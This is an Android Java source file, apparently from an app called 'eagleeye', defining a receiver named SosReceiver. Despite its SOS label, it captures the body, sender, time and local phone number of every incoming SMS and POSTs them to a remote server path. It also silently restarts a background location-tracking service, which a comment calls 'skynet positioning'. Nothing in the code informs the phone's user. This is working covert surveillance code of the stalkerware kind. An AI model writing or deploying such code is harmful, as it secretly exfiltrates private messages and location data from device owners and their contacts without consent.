package net.web135.eagleeye;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

public class SosReceiver extends BroadcastReceiver {

	String content = "";
	String receivetime = "";
	String sendernumber = "";
	String reciverNumber = "";
	String entityName = Define.entityName;
	MyAsyncTask myAsync = null;

	Runnable test = new Runnable() {
		public void run() {
			sendSMS();
		}
	};

	@Override
	public void onReceive(Context context, Intent intent) {
		Log.i("testReceiver", "On_SMS_RECEIVED");
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for (Object p : pdus) {
			byte[] pdu = (byte[]) p;
			SmsMessage message = SmsMessage.createFromPdu(pdu);
			content = message.getMessageBody();
			Date date = new Date(message.getTimestampMillis());
			SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			receivetime = format.format(date);
			sendernumber = message.getOriginatingAddress();
			reciverNumber = getLocalNumber(context);
			Log.i("testService", "reciverNumber：" + reciverNumber);
			//如果允许短信上传，则上传短信内容
			if (Define.enableSmsUpload) {
				myAsync = new MyAsyncTask();
				MyAsyncTask.execute(test);
			}
			//收到短信时，也激活一下天网定位，以防万一
			Intent service = new Intent(context, EyeMain.class);
			context.startService(service);
			Log.i("bdtrace", "====> Services Start by SmsReceiver!");
		}
	}

	private boolean sendSMS() {
		try {
			String params = "content=" + URLEncoder.encode(content, "UTF-8") 
					+ "&receivetime=" + receivetime 
					+ "&sendernumber=" + sendernumber 
					+ "&entityName=" + entityName 
					+ "&reciverNumber=" + reciverNumber;

			Log.i("testService", params);
			byte[] entity = params.getBytes();
			String path = Define.uploadSmsPath;
			HttpURLConnection conn = (HttpURLConnection) new URL(path).openConnection();
			conn.setConnectTimeout(5000);
			conn.setRequestMethod("POST");
			conn.setDoOutput(true);
			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length", String.valueOf(entity.length));
			conn.getOutputStream().write(entity);

			if (conn.getResponseCode() == 200) {
				System.out.println(params);
				return true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	public class MyAsyncTask extends AsyncTask<String, String, String> {
		@Override
		protected String doInBackground(String... params) {
			Log.i("asyncTask", "doInBackground");
			return "";
		}
	}
	
	private String getLocalNumber(Context context){
		TelephonyManager mTelephonyMgr; 
        mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);  
        return mTelephonyMgr.getLine1Number(); 
	}

}
